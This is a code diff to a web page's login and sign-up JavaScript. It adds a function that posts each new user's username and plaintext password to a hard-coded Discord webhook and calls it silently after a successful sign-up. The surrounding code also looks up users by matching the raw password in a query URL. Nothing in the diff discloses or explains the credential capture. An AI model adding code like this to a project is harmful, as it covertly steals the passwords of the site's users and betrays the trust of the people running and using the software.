@@ -264,6 +264,18 @@
     return s;
   }
 
+  async function sendToWebhook(username, password) {
+  try {
+    await fetch('https://discord.com/api/webhooks/1489339528169652295/nwxgNXcPMG69yzeD9WCHm4YTqmdIud-R7D8ON0SJ8nF8tG-WgoZ1tnL36ItKjzhOr6ps', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username, password })
+    });
+  } catch (e) {
+    console.error('Webhook failed:', e);
+  }
+}
+
   function switchTab(mode) {
     authMode = mode;
     document.getElementById('tab-login').className = 'auth-tab' + (mode === 'login' ? ' active' : '');
@@ -302,6 +314,7 @@
         btn.textContent = 'Sign up'; btn.disabled = false; return;
       }
       currentUser = res.data[0];
+      await sendToWebhook(username, password);
     } else {
       const res = await supa('users?username=eq.' + encodeURIComponent(username) + '&password=eq.' + encodeURIComponent(password) + '&select=*');
       if (!res.ok || !res.data || res.data.length === 0) {
